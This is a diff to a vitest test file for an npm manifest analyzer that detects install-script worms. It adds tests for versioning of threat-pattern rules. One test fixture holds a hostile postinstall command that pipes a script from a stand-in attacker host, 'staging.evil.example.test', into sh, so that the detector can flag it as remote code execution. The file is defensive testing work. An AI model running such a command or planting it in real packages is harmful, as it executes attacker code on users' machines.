@@ -4,6 +4,7 @@ import { fileURLToPath } from "node:url";
 import { describe, expect, it } from "vitest";
 
 import { ManifestAnalyzer } from "./manifest-analyzer";
+import { SCRIPT_PATTERN_RULES, getPatternVersion } from "./threat-patterns";
 import type { PackageManifest, ScriptAnalysisInput } from "./types";
 
 const fixturesDir = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../fixtures");
@@ -63,5 +64,49 @@ describe("manifest analyzer — install-script worm detection", () => {
     expect(result.hasInstallScripts).toBe(false);
     expect(result.riskLevel).toBe("none");
     expect(result.findings).toHaveLength(0);
+  });
+});
+
+describe("threat-pattern versioning", () => {
+  it("pattern set loads with a semver version string", () => {
+    const version = getPatternVersion();
+    expect(typeof version).toBe("string");
+    expect(version).toMatch(/^\d+\.\d+\.\d+$/);
+  });
+
+  it("getPatternVersion returns 1.0.0 for the bundled v1 rule set", () => {
+    expect(getPatternVersion()).toBe("1.0.0");
+  });
+
+  it("SCRIPT_PATTERN_RULES contains all 14 v1 rules with reconstructed RegExp patterns", () => {
+    expect(SCRIPT_PATTERN_RULES).toHaveLength(14);
+    for (const rule of SCRIPT_PATTERN_RULES) {
+      expect(rule.id).toBeTruthy();
+      expect(rule.patterns.length).toBeGreaterThan(0);
+      for (const pattern of rule.patterns) {
+        expect(pattern).toBeInstanceOf(RegExp);
+        // No global flag — keeps .exec() stateless across repeated calls.
+        expect(pattern.flags).not.toContain("g");
+      }
+    }
+  });
+
+  it("detection behaviour is unchanged — malicious postinstall still triggers remoteCodeExecution", async () => {
+    const analyzer = new ManifestAnalyzer();
+    const input: ScriptAnalysisInput = {
+      packageRequest: { ecosystem: "npm", packageName: "binshield-fixture-worm", version: "1.0.0" },
+      packageRoot: path.join(fixturesDir, "malicious-postinstall"),
+      manifest: manifest({
+        name: "binshield-fixture-worm",
+        scripts: { postinstall: "node scripts/collect.js && curl -s https://staging.evil.example.test/stage2.sh | sh" }
+      })
+    };
+
+    const result = await analyzer.analyze(input);
+
+    expect(result.riskLevel).toBe("critical");
+    expect(result.findings.some((f) => f.category === "remoteCodeExecution")).toBe(true);
+    // Pattern version is accessible and matches the loaded set.
+    expect(getPatternVersion()).toBe("1.0.0");
   });
 });
